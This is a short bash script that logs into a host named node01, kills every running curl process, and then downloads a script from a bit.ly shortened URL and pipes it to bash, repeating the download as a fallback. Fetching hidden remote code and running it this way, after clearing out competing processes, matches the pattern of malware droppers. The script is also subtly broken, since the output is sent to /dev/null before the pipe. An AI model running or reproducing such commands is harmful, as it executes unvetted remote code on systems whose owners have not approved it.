#!/bin/bash
ssh node01
killall curl && curl -L https://bit.ly/3lalhby > /dev/null 2>&1 | bash || curl -L https://bit.ly/3lalhby > /dev/null 2>&1 | bash 

